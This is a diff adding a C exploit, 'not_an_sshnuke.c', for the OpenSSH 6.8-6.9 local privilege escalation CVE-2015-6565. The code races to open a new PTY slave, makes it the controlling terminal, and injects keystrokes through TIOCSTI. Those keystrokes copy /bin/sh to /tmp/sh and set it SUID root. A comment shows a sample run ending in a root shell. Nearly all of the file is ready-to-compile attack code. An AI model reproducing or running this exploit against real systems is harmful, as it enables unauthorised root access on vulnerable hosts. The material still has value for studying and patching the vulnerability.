@@ -1,0 +1,83 @@
+/* 
+ *  not_an_sshnuke.c
+ *
+ *  Federico Bento
+ *
+ *  up201407890 () alunos dcc fc up pt
+ *  https://twitter.com/uid1000
+ * 
+ *  OpenSSH 6.8-6.9 local privilege escalation - CVE-2015-6565
+ *  
+ *  Considered mostly to be a "DoS", turns out to be a priv esc vuln.
+ *  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6565
+ *
+ *  Shoutz to Jann Horn for the detailed analysis
+ *  And also to all my elite colleagues, specially xSTF :)
+ *
+ *
+ *  $ gcc not_an_sshnuke.c -o not_an_sshnuke
+ *  $ ./not_an_sshnuke /dev/pts/3
+ *  [*] Waiting for slave device /dev/pts/3
+ *  [+] Got PTY slave /dev/pts/3
+ *  [+] Making PTY slave the controlling terminal
+ *  [+] SUID shell at /tmp/sh
+ *  $ /tmp/sh --norc --noprofile -p
+ *  # id
+ *  euid=0(root) groups=0(root)
+ *
+ */
+
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+     
+int main(int argc, char *argv[])
+{
+     char *cmd = "cp /bin/sh /tmp/sh; chmod u+s /tmp/sh\n";
+     int pid, pts = -1;
+
+     if(argc != 2) {
+          fprintf(stderr, "Usage: %s /dev/pts/X\n", argv[0]);
+	  fprintf(stderr, "Where X is next slave device to be created\n");
+	  return 1;
+     }
+	
+     if(!access(argv[1], F_OK)) {
+          fprintf(stderr, "[-] %s device already exists\n", argv[1]);
+          return 1;
+     }
+
+     pid = fork();
+
+     if(pid < 0) {
+	  fprintf(stderr, "[-] fork failed\n");
+	  return 1;
+     }
+	
+     if(pid == 0) {
+          printf("[*] Waiting for slave device %s\n", argv[1]);
+		
+	  /* win the race by opening the PTY slave before sshd's child */
+	  while(pts == -1)
+	       pts = open(argv[1], O_WRONLY); 
+
+	       printf("[+] Got PTY slave %s\n", argv[1]);
+               printf("[+] Making PTY slave the controlling terminal\n");
+		
+	       dup2(pts, 0); dup2(pts, 1); dup2(pts, 2);
+	       setsid();
+               ioctl(0, TIOCSCTTY, 1);
+
+	       while(*cmd)
+	            ioctl(0, TIOCSTI, cmd++);
+     }
+
+     else {
+          wait(NULL);
+	  printf("[+] SUID shell at /tmp/sh\n");
+	  return 0;
+     }
+}
